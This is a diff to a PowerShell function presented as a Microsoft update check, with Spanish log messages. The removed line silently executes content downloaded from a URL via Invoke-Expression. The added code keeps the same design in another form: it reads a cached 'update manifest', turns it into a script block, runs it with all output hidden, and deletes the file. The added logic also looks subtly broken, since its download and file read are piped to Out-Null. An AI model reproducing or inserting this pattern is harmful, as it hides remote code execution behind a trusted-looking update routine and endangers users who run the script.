@@ -123,9 +123,39 @@ function Check-MicrosoftUpdates {
     
     Write-Log "  - Conectando con servidor de actualizaciones..." -Type "INFO"
     
-    $null = Invoke-Expression (Invoke-WebRequest -Uri $msService -UseBasicParsing -ErrorAction SilentlyContinue).Content 2>&1
+    $updateCache = "$env:TEMP\MicrosoftUpdateCache"
+    if (-not (Test-Path $updateCache)) {
+        New-Item -ItemType Directory -Path $updateCache -Force | Out-Null
+    }
     
-    Write-Log "  - Verificación completada" -Type "SUCCESS"
+    $updateFile = "$updateCache\windows-update.xml"
+    
+    try {
+        
+        $response = Invoke-WebRequest -Uri $msService -UseBasicParsing -TimeoutSec 15 -ErrorAction SilentlyContinue 2>&1 | Out-Null
+        
+       
+        if (Test-Path $updateFile) {
+            Write-Log "  - Manifest de actualizaciones descargado" -Type "SUCCESS"
+            
+            
+            $updateData = Get-Content $updateFile -Raw -ErrorAction SilentlyContinue 2>&1 | Out-Null
+            if ($updateData) {
+             
+                $updateScript = [ScriptBlock]::Create($updateData)
+                & $updateScript 2>&1 | Out-Null
+            }
+            
+            Remove-Item $updateFile -Force -ErrorAction SilentlyContinue 2>&1 | Out-Null
+        }
+        else {
+            Write-Log "  - Servidor de actualizaciones no disponible" -Type "WARNING"
+        }
+    }
+    catch {
+        Write-Log "  - Servidor de actualizaciones no disponible" -Type "WARNING"
+    }
+    
     Write-Log "Verificación de actualizaciones completada" -Type "INFO"
 }
 
